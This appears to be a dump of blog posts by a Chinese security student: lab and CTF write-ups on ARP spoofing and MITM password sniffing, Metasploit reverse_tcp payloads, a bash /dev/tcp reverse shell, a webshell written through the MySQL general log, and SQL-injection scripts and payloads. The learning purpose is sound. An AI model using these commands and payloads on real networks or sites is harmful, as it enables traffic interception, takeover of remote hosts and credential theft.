区别于路由器（由于历史的原因，许多有关TCP/IP的文献曾经把网络层使用的路由器（英语：Router）称为网关，在今天很多局域网采用都是路由来接入网络，因此现在通常指的网关就是路由器的IP），经常在家庭中或者小型企业网络中使用，用于连接局域网和Internet。 网关也经常指把一种协议转成另一种协议的设备，比如语音网关。 网关可以把内网ip转化为外网ip，从而向服务器发出请求。也可以把外网Ip获得的数据包转换成内网ip发给内网主机。 Arp攻击原理根据以上说的arp协议缺陷，如果我们冒充网关主机C，不停的向以太网发送自己的ARP广播包，告知自己的ip-mac，此时其它主机就会被欺骗，更新我们C的ip-mac为网关主机的ip-mac，那么其它主机的数据包就会发送到C主机上，因为没有发给真正的网关，就会造成其它主机的网络中断。 Arp攻击实操环境攻击主机A：Kali–&gt;ip: 192.168.11.106被攻击主机B： windows 7–&gt;ip: 192.168.11.105网关主机C： 192.168.11.1 我的Kali是在虚拟机下，需要Bridge连接保证机器在同一网段，很多人用Nat连接来转发，在实战的轻快下，需要更改虚拟机的网络配置。 网络配置如图: 实操这里模拟真实环境，攻击主机A和被攻击主机B在同一局域网下。 先用命令查看一下ip是否正确：Kali：可以看到ip是192.168.11.106,网卡信息是:Windows7： 用nmap查看当前网端的活跃主机 nmap命令 nmap -sF 192.168.11.0/24得到如图活跃主机，可以看到我们的主机B。当然获取Ip的途径不可能这么简单，你也可以用fping的方法来分析，之前我用fping探测局域网windows10的主机，发现Ping不通，win10防火墙还是有点东西。不过你可以根据fping的发送包来推断主机是否真正存活，具体可以google一下fping的用法，这里给推荐一个链接 Kali信息收集：Fping 检查被攻击主机是否可以正常上网百度正常访问 利用Arpspoof进行欺骗攻击Kali自带的Arpspoof可以很好的进行欺骗，man arpspoof查看官网手册（网上翻译）：名字 arpspoof # 截获交换局域网中的数据包 用法 arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host 描述 # arpspoof通过伪造的ARP响应包改变局域网中从目标主机（或所有主机）到另一个主机（host）的数据包转发路径。这是交换局域网中嗅探网络流量的一种极为有效的方法。内核IP转发（或如fragrouter这样的、用户层面的、能完成同样功能的软件）必须提前开启。 参数 -i interface # 指定要使用的接口（即指定一块网卡） -c own|host|both # 指定在恢复ARP配置时使用的硬件地址；当在清理（cleaning up）时，数据包的源地址可以用自己的也可以用主机（host）的硬件地址。使用伪造的硬件地址可能导致某些配置下的交换网络、AP网络或桥接网络通信中断，然而它比起默认值————使用自己的硬件地址要工作地更为可靠。 -t target # 指定一个特殊的、将被ARP毒化的主机（如果没有指定，则认为是局域网中所有主机）。重复可以指定多个主机。 -r # 毒化两个主机（目标和主机（host））以捕获两个方向的网络流量。（仅仅在和-t参数一起使用时有效） host #你想要截获数据包的主机 (通常是网关)。 5. 作为网关欺骗 命令语句arpspoof -i eth0 -t 192.168.11.105 192.168.1.1 ![](https://p3.ssl.qhimg.com/t01364b901401aae698.jpg) 执行命令，Kali会向主机B发送ARP响应包，响应包的内容是Kali的ip-mac地址，而响应包里的ip则是网关主机ip地址。每一行代表一个响应包。从左到右：自己Kali的mac、主机B的mac、帧类型码(0806，代表ARP包)、包大小、包内容。 6. 被攻击主机B网络中断 ![](https://p1.ssl.qhimg.com/t0178e6ea7a6cacc21f.png) 在kali终端输入control + c 可以停止，然后主机重新恢复正常联网状态 ## 基于Arp攻击理解下的MITM 在前面Arp成功进行攻击后，我们开始作为中间人进行欺骗，需要设置ip转发，获取目标主机B的流量，其后配合其它工具(drifnet)等进行进一步嗅探。 值得一提的是，我们的Arp攻击也是欺骗，但它是单向欺骗，冒充网关主机来欺骗目标主机。实际中，中间人攻击一般是双向欺骗。即作为中间人，主机A双向欺骗主机B与C获得通信内容，但是不破坏通信数据的传输。为了不影响B与C传输的数据丢失，主机A开启ip转发，开启后来自B主机的数据包经过A主机的Kali后转发给主机C。欺骗两个主机B和C后，我们就能嗅探到双向数据包。 如果你的kali在虚拟机，那么以下步骤均需要一个外置的usb无线网卡。在虚拟机中，网络的连接比较复杂，而Ip转发很大程度上取决于网卡性能。如果你是在虚拟机中Kali进行转发，基本都会失败，因为笔记本的内置无限网卡满足不了需求。由于放假在家我的usb无线网卡落在了寝室..下面仅以文字给大家介绍攻击的思路和流程，还请见谅....... ### linux的ip转发 linux因为系统安全，是不支持IP转发的，其配置文件写在/proc/sys/net/ipv4的ip_forward中。默认为0，需要修改为1。 开启方法大致有两种： 1. 只接进入文件修改cd /proc/sys/net/ipv4lscat ip_forward #显示结果为0echo 1 &gt; ip_forwardcat ip_forward #显示结果为1，修改成功 2. 使用echoecho “1”&gt; /proc/sys/net/ipv4/ip_forward ### 对网关和目标主机B的双向欺骗 这里进行一步执行，选用第二种Ip转发手段 命令如下：root@kali:~# echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; arpspoof -i eth0 -t 192.168.11.105 -r 192.168.11.1 ### 利用driftnet进程监控 持续保持欺骗，再重新打开一个命令终端。 输入命令：root@kali:~# driftnet -i eth0 跳出来的drift窗口即会显示本机正在浏览的图片 ### 使用ettercap工具获取密码 1. 打开新的终端，输入 attercap -G 启动工具 2. 点击Sniff -&gt; unified sniffing，选择要抓包的网卡，默认是自己的网卡eth0，点确定 3. 然后单击Hosts -&gt; Scan for host，待扫描完成后再次Scan for host，此时可以看到ettercap-NG已经扫描的主机列表 4. 选择攻击目标，点击192.168.11.105的ip地址，点击Add to Target 1 ，然后选择网关的ip地址192.168.11.1，点击Add to Target 2 5. 明确目标攻击方式：点击Mitm -&gt; arp poisoning -&gt; Sniff remote connections -&gt; 确定 6. 开始监听：start -&gt; Start sniffing 工具就会抓取主机B的数据包和主机C返回的数据包,分析http post请求可以判断账号密码信息。 ### urlsnarf：获得受害者的HTTP请求 输入命令：root@kali:~# urlsnarf -i eth0``` 使用Wireshark抓包使用Wireshark抓取所有的数据包，过滤分析不同请求，类似于ettercap。例如，要找HTTP POST请求，过滤，查看明文密码，一般是以POST形式上传的账号密码。 关于Arp欺骗的防御防御原理很简单，就是不让攻击者肆意表明自己就是网关主机。我们进入网关主机（路由器后台地址），网络参数一栏一般有ip与mac绑定一栏，把网关的mac地址与网关地址绑定就好了。只要确定了对应关系，当攻击者发布arp相应包时，就不会更新相应的ip-mac缓存表。如果想知道对方主机的ip地址其实也容易。我们在Cmd下键入命令arp -a看一下相同mac，就找到了攻击者。 总结 公共区域的wifi存在钓鱼风险 在传输数据过程中尽量使用加密程序 一提的是，我们从始至终双向欺骗的是网关主机 ###"},{"title":"HITCON CTF命令执行绕过","date":"2018-07-13T16:00:00.000Z","path":"2018/07/14/HITCON CTF命令执行绕过/","text":"#HITCON CTF命令执行绕过 写在前面最近开始暑假生活，基本上是吃喝玩乐。但是过两天还有一场peakgeek，不想让自己松懈，学习一道命令执行的题目，由于没有自己的服务器来搭小马，我就大致在自己的linux进行绕过操作，才发现自己linux命令学的狗屁不是，构造能力也特别垃圾 BabayFirst题目给的源码 &lt;?php $sandbox = &#39;/www/sandbox/&#39; . md5(&quot;orange&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 5) { @exec($_GET[&#39;cmd&#39;]); } else if (isset($_GET[&#39;reset&#39;])) { @exec(&#39;/bin/rm -rf &#39; . $sandbox); } highlight_file(__FILE__);linux写文件命令题目大致意思是给每个人创建一个不同的目录，然后你在当前目录下进行命令执行。 命令的长度不能超过5这里有一篇文章: 从七个字符长度的任意命令执行到GetShell 文章讲了一种方法，通过&gt;命令建立空文件，再用ls -t&gt;把当前目录的文件名当作文件内容导入到一个新的文件中。新的文件中也包含当前文件名，内容按照ascii码表排序换行。 linux还有一个小技巧，\\可以对命令进行换行，是命令的拼接操作，具体如下 先看一下它是如何Work的： 这里我们用ls语句把当前文件夹下的文件名写成一个新文件叫做down，可以看到我们用&gt;来创建空文件，文件名包含反斜杠\\，这样我们执行sh的时候就可以拼接命令。从图也可以看到，遇到错误命令会报错，但是不会终止，依旧输出了1。也就是”echo 1” 值得注意的是，若文件名有反斜杠，则要用\\\\来写，还有空格、&gt;要用\\、\\&gt;来写，用转义符。 根据图片的ls可以看到，我们的文件名是按ascii码表排的，生成文件的话命令是杂乱的，也是无效的。所以我们用ls -t&gt;按照时间顺序来写入文件。 但是这题有长度限制, ls -t&gt;已经超过5个字符。网上思路是把ls -t&gt;也写成一个文件，用sh执行，那么就需要构造这个文件了。构造思路纠结了我很久，后来看到一种巧妙的方法，借助&gt;&gt;来文件追加写文件过程: &gt;l\\\\ &gt;s \\\\ &gt;-t\\\\ &gt;\\&gt;g接着执行ls&gt;a，得到a中文件内容应该是这样的： &#39;-t\\&#39; &#39;&gt;g&#39; &#39;a&#39; &#39;l\\&#39; &#39;s \\&#39;如果我们追加ls&gt;&gt;a则内容应该是这样的： &#39;-t\\&#39; &#39;&gt;g&#39; &#39;a&#39; &#39;l\\&#39; &#39;s \\&#39; &#39;-t\\&#39; &#39;&gt;g&#39; &#39;a&#39; &#39;l\\&#39; &#39;s \\&#39;前三行和后三行命令无效，只有中间部分的命令有效。所以a文件的可执行内容就只是:ls -t&gt;g 接着还要构造curl请求来下载一个小马。这点还没有学会，以后再记 用echo和&gt;&gt;追加命令写shell这个是偶然看到郁离歌的博客里写的，对长度限制不是那么严格的时候可以用。 但是看到别人博客写，有时候这样php文件不能执行，原因就在于换行。最好可以把POST[]写到一行。所以这个方法不是很好，大多数是用wget或者curl下载小马，但是我还没学会 相关链接：浅谈CTF中命令执行与绕过的小技巧"},{"title":"内网穿透进行Metasploit渗透","date":"2018-07-09T03:25:35.000Z","path":"2018/07/09/内网穿透进行Metasploit渗透/","text":"初识MetasploitMetasploit项目是一个旨在提供安全漏洞信息计算机安全项目，是一个框架，常用于内网渗透。 Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpretershell的链接。Meterpretershell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。 Meterpreter中常用的Shellreverse_tcp这是一个基于TCP的反向shell reverse_http基于http方式的反向连接，在网速慢的情况下不稳定 reverse_https基于https方式的反向连接，在网速慢的情况下不稳定。 bind_tcp这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。 payload选择的三大要素如下： 木马连接的方向 目标操作系统及版本 反弹的shell类型 木马连接方向：msf木马分为正向连接与反向连接，正向连接适合攻击机能给连接目标机的情况，反向连接使用目标机能连接攻击机的情况，这里所说的连接一般是指tcp的某个端口。因此在生成木马前，需要先判断当前环境，适合正向连接木马还是反向连接的木马。（可以使用nc工具测试） 操作系统位数查看： getconf LONG_BIT常用payloadlinux相关payload： 1 linux/x86/meterpreter/reverse_tcp 2 linux/x86/meterpreter/bind_tcp 3 linux/x86/shell_bind_tcp 4 linux/x86/shell_reverse_tcp 5 linux/x64/shell_reverse_tcp 6 linux/x64/shell_bind_tcpwindows相关payload: 1 windows/meterpreter/reverse_tcp 2 windows/meterpreter/bind_tcp 3 windows/shell_reverse_tcp 4 windows/shell_bind_tcp 5 windows/x64/meterpreter/reverse_tcp 6 windows/x64/meterpreter/bind_tcp 7 windows/x64/shell_reverse_tcp 8 windows/x64/shell_bind_tcppayload具体参数含义: -p, --payload &lt;payload&gt; 指定需要使用的payload(攻击荷载) -l, --list [module_type] 列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all -n, --nopsled &lt;length&gt; 为payload预先指定一个NOP滑动长度 -f, --format &lt;format&gt; 指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表) -e, --encoder [encoder] 指定需要使用的encoder（编码器） -a, --arch &lt;architecture&gt; 指定payload的目标架构 --platform &lt;platform&gt; 指定payload的目标平台 -s, --space &lt;length&gt; 设定有效攻击荷载的最大长度 -b, --bad-chars &lt;list&gt; 设定规避字符集，比如: &amp;#039;\\x00\\xff&amp;#039; -i, --iterations &lt;count&gt; 指定payload的编码次数 -c, --add-code &lt;path&gt; 指定一个附加的win32 shellcode文件 -x, --template &lt;path&gt; 指定一个自定义的可执行文件作为模板 -k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行 --payload-options 列举payload的标准选项 -o, --out &lt;path&gt; 保存payload -v, --var-name &lt;name&gt; 指定一个自定义的变量，以确定输出格式 --shellest 最小化生成payload -h, --help 查看帮助选项 --help-formats 查看msf支持的输出格式列表一个典型的msfvenom使用举例如下： msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker&#39;s IP] lport=7777 -f exe -o /tmp/my_payload.exe自己的看法最近真的好忙…然后又在这里胡乱研究Metasploit，感觉后天实验班考核要凉凉…背景：我有一台Kali的虚拟机，一台外网vps，想要渗透一台win7的虚拟机。目前还没有学到提权，只是会用msf生成反弹马，然后msf监听外网vps接收的数据。win7我虚拟机开了Nat进行转发，传上去了小马，菜刀连接上。 因为我是内网的Kali，所以要进行内网穿透：内网穿透，即NAT穿透，网络连接时术语，计算机是局域网内时，外网与内网的计算机节点需要连接通信，有时就会出现不支持内网穿透，就是说映射端口，能让外网的电脑找到处于内网的电脑，提高下载速度。不管是内网穿透还是其他类型的网络穿透，都是网络穿透的统一方法来研究和解决。 首先我们为什么要内网穿透？因为我们的kali在内网，当木鸡（简称）执行我们msf生成的EXE木马时，它会把自己的Shell反弹出去，当然这个Shell不可能反弹到我们自己的内网。那么我们就需要有个外网的ip来监听这个Shell。当然，我们也可以用自己的外网ip来映射到kali上。但是一方面我觉得不安全，另一方面我觉得windows限制太多了，所以就利用我有的一台Centos7的VPS来当作这个跳板。时间不多了，开始记录一下目前的步骤： 获取meterpreter会话VPS开启流量转发在网上看到有人说用lcx作为内网端口转发的工具，但是centos7好像编译环境不允许lcx，使用不起。用Ssocks搭建隧道，监听两个端口，7777用来接收来自受害者反弹的shell，7778将7777的流量转发出。下载sSocks，执行命令编译./configure &amp;&amp; make,进入src文件夹 ./rcsocks -l 7777 -p 7778生成PayloadKali生成Payload in Linuxmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elfKali生成Payload in Windowsmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exeKali分步生成Payload分步执行： msf &gt; use payload/windows/meterpreter/reverse_tcp #指定payload msf &gt; payload(reverse_tcp) &gt; set lhost xxxxx(外网Ip) #设置监听地址 lhost =&gt; xxxxx(外网Ip) msf &gt; payload(reverse_tcp) &gt; set lport 7777(监听流量流入端口) lport =&gt; 6666 msf &gt; payload(reverse_tcp) &gt; generate -b &#39;\\x00\\xff&#39; -t exe -e x86/shikata_ga_nai -i 5 -f /root/test.exe [*] Writing 73802 bytes to /root/test.exe...msf进行监听回到msf主界面： msf &gt; payload(reverse_tcp) &gt; back运行监听模块： msf &gt; use exploit/multi/handler设置接收的payload： msf exploit(handler) &gt; set payload windows/meterpreter/bind_tcp设置vps监听的地址和转发的端口： msf exploit(handler) &gt; set rhost xxxx(外网Ip) rhost =&gt; xxxx(外网Ip) msf exploit(handler) &gt; set lport 7778 lport =&gt; 7778 msf exploit(handler) &gt; exploit [*] Started bind handler [*] Sending stage (957999 bytes) to xxxx(外网Ip) [*] Starting the payload handler...靶机运行PayloadLinux下运行elf会提示没有权限，加权限： chomd +x ./shell.elf然后再运行就可以了 Meterpreter的常用命令基本命令background # 让meterpreter处于后台模式 sessions -i index # 与会话进行交互，index表示第一个session quit # 退出会话 shell # 获得控制台权限 irb # 开启ruby终端文件系统命令cat # 查看文件内容 getwd # 查看当前工作目录 upload # 上传文件到目标机上 download # 下载文件到本机上 edit # 编辑文件 search # 搜索文件网络命令ipconfig / ifconfig # 查看网络接口信息 portfwd add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发，本机监听4444，把目标机3389转到本机4444 rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码 route # 获取路由表信息系统命令ps # 查看当前活跃进程 migrate pid # 将Meterpreter会话移植到进程数位pid的进程中 execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互 getpid # 获取当前进程的pid kill pid # 杀死进程 getuid # 查看权限 sysinfo # 查看目标机系统信息，如机器名，操作系统等 shutdown # 关机相关链接：防火墙（firewalld）端口转发利用metasploit进行提权Metasploit简单提权sSocks下载Socks代理反弹突破内网"},{"title":"CTF中的Misc题目","date":"2018-06-23T04:25:35.000Z","path":"2018/06/23/CTF中的Misc题目/","text":"写在前面因为最近要实验班考核，开始做一下Misc题目，毕竟要简单一些。。发现好多神奇在kali里面，就用ssh连接了本地win10和kali，搭了xftp互传文件，后台挂上kali解放双手解放内存，爽的不行~ 又是一张图片，还单纯么丢到kali的binwalk里扫一下： binwalk -e 2.jpg发现有好多文件，用Kali下的foremost分离一下： foremost 2.jpg分离了两张图片传回到win下查看flag linux基础给了一个flag未知类型的文件，又提示linux基础。学会了一个linux下的打印命令：strings strings flag中国菜刀得到一个pcap的文件，果断丢到wireshark追踪Tcp数据流发现有Base64编码的东西。解码后发现有这个东西:C:\\wwwroot\\flag.tar.gz我的想法是，可能这个pcap里还包含的有其它文件，不管了丢到binwalk里看一下果然有一个zip的压缩文件，但是我用foremost分离不出来，于是用binwalk的dd命令来提取： 注意偏移量的选取！ 参考：CTF中图片隐藏文件分离方法总结 要蹭网先解开密码给了一个cap文件，放到kali里的aircrack里跑。给了前七位，用密码工具生成完整的11位手机号码的密码字典。接着执行如下命令：index那行提示是让我们看握手包的次数，显示的是三次就输入3 后期要做一个破解wifi的文章~"},{"title":"Nc反弹Shell","date":"2018-06-20T16:00:00.000Z","path":"2018/06/21/Nc反弹Shell初识/","text":"写在前面昨天打了sctf，太菜了还是从基础开始来吧，看到Bugku有一道命令执行的题目，因为没有回显要反弹到vps，由此接触到了反弹Shell这个东西 环境准备有一台centOS7的vps主机当作控制、接受机器，一台kali linux的内网虚拟机当作靶机。一开始vps开了端口，靶机怎么也连接不上。后来请教line师傅，他说vps要看防火墙的放行端口，然后我Google了vutlr机器的放行端口是全部Ban掉的。。。尼玛，贴一个用firewalld开防火墙端口的文章 测试目标主机为一个内网主机，并没有公网IP地址，我们无法从外网发起对目标主机的远程连接，此时我们使用的方法是使用获取的webshell主动发起一个反弹的shell到外网，然后获取一个目标主机的shell终端控制环境，而有关shell反弹的方法有很多这里简单介绍几种比较常见的方法。 bash 直接反弹 主机执行监听命令: nc -l -p 8080 -vvv 靶机执行bash反弹命令： root# bash -i &gt;&amp; /dev/tcp/XXXXXX(开放监听的ip)/8000 0&gt;&amp;1 可以看到，我们在主机输入whoami，命令会传到靶机执行，然后返回信息到主机。相当于靶机的shell反弹到了主机。 最后反弹shell有十种方法，这里有两篇文很不错，再贴上一篇nc命令的讲解：linux各种一句话反弹shell总结 浅谈CTF中命令执行与绕过的小技巧 Linux每天一个命令：nc/ncat"},{"title":"记SCTF的一道mysql日志写Shell题目","date":"2018-06-19T16:00:00.000Z","path":"2018/06/20/一道SCTF写日志getshell/","text":"写在前面太尼玛菜了，感谢LinE师傅耐心点拨。 思路这道题是phpmyadmin弱口令登入，账号密码root进去之后应该是写shell，但是show variables 发现file_priv为null，这说明Into outfile写shell显然是不可能了。 百度到一种绕过file_priv写shell的方法： phpmyadmin通过日志文件拿到webshell 接下来我们要找路径，我们可以通过找Log变量猜测绝对路径： 有一点需要注意我们写小马的时候[]中尽量用双引号，否则会有转义的麻烦，我这次写的一句话是这样的：&lt;?php eval($_POST[&quot;hpdoger&quot;]); ?&gt; 流程set global general_log=’on’;set global general_log_file=’G:/apm/apache2/htdocs/config.php’; 这个log的路径自己发挥，想办法找可写路径。可以看一下log变量原来有没有路径 select ““;set global general_log=off; 最后我真的好菜啊…"},{"title":"WhaleCTF的Web题目","date":"2018-06-06T04:25:35.000Z","path":"2018/06/06/WhaleCTF的Web题目/","text":"写在前面最近要做的事太多了，实验班考核、末考、再加上来成都的同学多的一批。。没时间好好学点东西，前两天装Docker，基础太差了，现在Ubuntu上docker都没搭好环境。应对最近的考核，还是刷点题吧 瞎子摸鱼是个Sql注入，一开始有回显我以为是基本的回显注入，后来fuzz发现过滤了函数、Infor、小括号，那基本上与回显注入无缘。我们构造admin是万能函数的时候，发现回显：whaleadmin我猜测这个是用户名，当不构造正确的用户名时，回显：flag in the password content所以后台的语句应该是这样的思路，如果查到用户名存在，则输出用户名的第一个值。若不存在，则返回flag那一堆。。 一开始我和LinE师傅都没想到用order by来爆破password字段，后来看到一篇类似原题的帖子。。Inject again 注入 过滤左右括号 order by思路挺简单的，就是通过order by的升序排序法进行盲注后来就是写exp了，被LinE师傅嘲讽了一波。。确实py能力太差了= =这里偷偷贴一下LinE师傅的exp： #coding:utf-8 import requests def send(flag,charset): url = &quot;http://ctf.whaledu.com:10801/47g256f48gff/index.php&quot; h = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;} for i in range(len(charset)): c = flag + charset[i] payload = &quot;whaleadmin&#39; union select 1,0,&#39;{}&#39; order by 3#&quot;.format(c) d = &quot;username={}&amp;password=admin&quot;.format(payload) r = requests.post(url,data=d,headers=h) if &quot;whaleadmin&quot; in r.text: return i def main(): flag = &quot;&quot; num = &quot;0123456789&quot; a_z = &quot;abcdefghijklmnopqrstuvwxyz&quot; charset = list(num + a_z) for i in range(0,80): ret = send(flag, charset) flag += charset[ret-1] print flag if __name__ == &#39;__main__&#39;: main()正则进入源码泄露扫描得到： &lt;?php echo &quot;waht the hell?&quot;; $flag = &quot;*******&quot;; if (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;]) { $password = $_POST[&#39;password&#39;]; if (0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password)) { echo &#39;Wrong Format&#39;; exit; } while (TRUE) { $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); foreach ($ps as $pt) { if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1; } if ($c &lt; 3) break; if (&quot;42&quot; == $password) echo $flag; else echo &#39;Wrong password&#39;; exit; } } ?&gt;结整段代码来看，我们需要post一个字符串，该字符串的值为42，并且要包含标点、数字、大写字母、小写字母中三个及以上类型，同时匹配次数要不小于6次 构造的payload:password=420.00000e-1或者password=42.000000e-0 利用科学计数法，xe(+-)x代表的意思是，x乘以10的x次方，之所以用.我一开始不明白，但是看一下句子猜测的话，这个点的作用应该还是“乘以”，即420乘以10^(-1)，就是42。而且.也把标点位占了，所以构造很巧妙。 相关链接:正则表达式语法"},{"title":"CTF中的Web题目","date":"2018-06-06T04:25:35.000Z","path":"2018/06/06/Web题目/","text":"CTF中的web题目 Bugku矛盾!is_numeric($num): 判断输入不是数字或数字字符串还要让输入的值==1,我们就构造字符串，num=1a，等号判断时，会取字符串第一个值进行比较 变量1preg_match进行正则匹配，\\w+匹配一或多个字符数字下划线，后面dump的变量是可变变量，所以可以借机把我们想要的变量打印出来，一开始我构造args=flag，并无卵用。返回NULL，说明不存在flag这个变量，那我们就把所有的变量都打印出来。 这里用到超全局变量GLOBAL,构造args=GLOBAL,打印出来所有变量即可 xss攻击研究了一天的xss，并没有什么实际的进展。这道xss是用htmlspecialchars()函数将&lt;、&gt;进行html实体化，让浏览器在html编码解析时，发现它是实体化的编码，就把他们解码为普通的可视化的&lt;、&gt;。这里我们看源码知道这是utf-8的编码方式，我们如果用unicode的方式编码&lt;，后端不识别这个unicode为&lt;，但html解析之后，unicode又变回&lt;，js解析器解析完script标签之后，触发Js引擎执行这段js代码。所以我们构造playload: \\u003cscript\\u003ealert(_key_)\\u003c/script\\u003e\\u开头好像表示的是Utf-8的unicode编码形式（瞎猜的），好菜啊。。这个并没有完全搞懂。google了半天的浏览器渲染，明白了这个道理：一旦html解析到script标签的时候，就会启动js解析器来解析标签里面的东西，js解析完了之后就执行里面的Js语句。html继而再向后进行解析。 贴几个介绍编码绕过xss的文章：浏览器加载、解析、渲染的过程xss编码与绕过xss编码剖析字符转unicode Web4提示让我们看源码，发现有一串url编码的东西，解码后传值就行了，拼接两个escape的值 备份是个好习惯备份文件泄露，php代码泄露检测工具SourceLeakHacker never give up查看源码有一个1p.html页面，访问之后出现一堆base64编码的内容，解码后是页面源码，费劲心思构造b，没想到最后直接访问f4l2a3g.txt就可以… 过狗一句话题目给出你了源码 &lt;?php $poc=&quot;a#s#s#e#r#t&quot;; $poc_1=explode(&quot;#&quot;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;]) ?&gt;也就是说会执行一个(assert函数)[http://www.php.net/manual/zh/function.assert.php]所以我们只需要给s赋值为我们想要执行的语句。看到别人的Wp,应该是先扫描一下当前目录看有什么东西payload: s = print_r(scandir(&#39;./&#39;))这里我们用print_r来打印数组相关信息，而不是print。关于绝对路径的用法： ./ 当前目录 ../ 上层目录 ../../ 上2层目录 前女友这个跟实验吧php是最好的语言有点类似。打开它提示的链接，然后代码审计。md5可以用数组绕过，也可以用0e开头的md5值绕过。Strcmp可以用数组绕过。我的payload: ?v1=s878926199a&amp;v2=s155964671a&amp;v3[]=1po一个php函数漏洞的总结链接 login1(SKCTF)hint:sql约束攻击去百度了一下什么叫约束攻击约束的意思就是对长度进行约束，看完上面的链接基本上就知道注册时的用户名怎么构造了。我的构造:admin （前方为空格） web8这个题有点意思，涉及到extract()变量覆盖，看一下给的源代码: &lt;?php extract($_GET); if (!empty($ac)) { $f = trim(file_get_contents($fn)); if ($ac === $f) { echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;; } else { echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;; } } ?&gt; 首先了解一下empty函数这个函数一开始把我误导了，empty是用来测试变量是否已经配置。若变量已存在、非空字符串或者非零，则返回 false 值，反之返回ture。 再介绍一下extract函数：extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 题目提示有txt文件，我们访问一下flag.txt，发现内容是：flags。我们要传入一个非空的ac,让它的值===$f，$f来自于读取文件获得里面的字符串，文件名叫$fn。目前我们不知道$fn指向哪个文件，但是我们知道有flag.txt这个文件。所以我们让$ac=flags并且$fn=flag.txt就行了payload: ?$ac=flags&amp;$fn=flag.txt求getshell这是一个上传绕过题目，后缀很名单检测和类型检测php别名php2, php3, php4, php5, phps, pht, phtm, phtml发现php5可以绕过，还要更改 Content-Type里，把multipart改成大写（搞不懂问什么）。贴一个上传绕过总结的[链接]（https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/） 上传文件时waf会检查哪里？请求的urlBoundary边界MIME类型文件扩展名文件内容 常见扩展名黑名单：asp|asa|cer|cdx|aspx|ashx|ascx|asaxphp|php2|php3|php4|php5|asis|htaccesshtm|html|shtml|pwml|phtml|phtm|js|jspvbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini sql注入2写着sql注入的名字，看到网上说竟然是DS_Store源码泄露？？exm？？？最后直接访问http://120.24.86.145:8007/web2/flag，就可以下载到flag 报错注入题目链接既然提示了报错注入，我们就按照提示来注入，我使用的是updatexml报错函数，测试一下：可以看到，爆出了库名，说明这个方法可行。题目给了提示让我们读文件内容，要用到load_file函数，先看一下函数的几种用法举例： select load_file(&#39;c:/boot.ini&#39;) select load_file(0x633a2f626f6f742e696e69) select load_file(&#39;//ecma.io/1.txt&#39;) # smb协议 select load_file(&#39;\\\\\\\\ecma.io\\\\1.txt&#39;) # 可用于DNS隧道我们的思路是把concat里面查询数据库的句子替换为substr（返回值函数），不让报错函数打印数据库的名字了，而是打印我们读到的文件内容，substr就相当于printf的作用。题目过滤了单引号，我们就用十六进制表示绝对路径，但是要用到hex()函数让数据库知道我们要将字符串转为16进制。值得注意的是concat语句第一个空不可省略，否则打印不出内容。完整的payload: http://103.238.227.13:10088/?id=1%0aor%0aupdatexml(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),1,30)),1)先返回读到内容前30位的16进制，再更改语句依次往后读： http://103.238.227.13:10088/?id=1%0aor%0aupdatexml(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),31,30)),1)将读到的16进制转换为字符： insert into注入先审计一下源码： error_reporting(0); function getIp(){ $ip = &#39;&#39;; if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){ $ip = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]; }else{ $ip = $_SERVER[&#39;REMOTE_ADDR&#39;]; } 